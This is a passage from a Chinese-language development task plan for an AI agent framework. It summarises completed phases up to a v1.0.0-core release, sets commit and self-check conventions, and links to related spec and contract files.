3. ✅ Phase 3: US-1 → Provider 抽象就绪（无 Demo，独立冒烟 `provider test`）
4. ✅ Phase 4: US-2 → ReAct 循环就绪（**Demo 一前置条件**完成；不立即跑完整 Demo）
5. ✅ Phase 5 + Phase 6: US-3 + US-4 并行（**Demo 二 + Demo 三前置**完成）
6. ✅ Phase 7: US-5 → Web Service 就绪 → **3 个 Demo 端到端跑通**
7. ✅ Phase 8: Polish → 发版 v1.0.0-core

### 串行 vs 并行选择

- 单人开发（当前情况）：**串行**按 US 顺序，避免模块依赖打架
- 多人协作（未来扩展阶段）：US-3 + US-4 可分配给 2 个 Developer 并行

---

## Notes

- [P] 任务 = 不同文件 / 无依赖，可并发
- [Story] 标签映射到对应 US 用于追踪
- 每个 US 应独立完成并独立测试
- 提交频率：每个 task 完成或每个 US 完成时各 commit 一次
- 在任意 checkpoint 可停下验证 story 独立性
- 避免：模糊任务、同文件冲突、跨 story 依赖破坏独立性
- **constitution §3 偏离纠错清单**是每次 commit 前的强制自检（特别是禁用 Spring AI 自动 tool 执行）

---

## 引用

- [plan.md](plan.md) — Technical Context + Constitution Check + Project Structure
- [spec.md](spec.md) — 5 US + 49 FR + 15 SC
- [research.md](research.md) — 15 个技术决策（D1-D15）
- [data-model.md](data-model.md) — 11 个实体
- [contracts/rest-api.yaml](contracts/rest-api.yaml) — 10 个 REST 端点
- [contracts/agent-profile-schema.json](contracts/agent-profile-schema.json) — AGENT.md frontmatter
- [contracts/cli-commands.md](contracts/cli-commands.md) — 12 个 CLI 命令
- [contracts/mcp-servers-schema.json](contracts/mcp-servers-schema.json) — MCP 配置
- [quickstart.md](quickstart.md) — 3 个 Demo 验证步骤
- [.specify/memory/constitution.md](../../.specify/memory/constitution.md) — constitution v1.0.0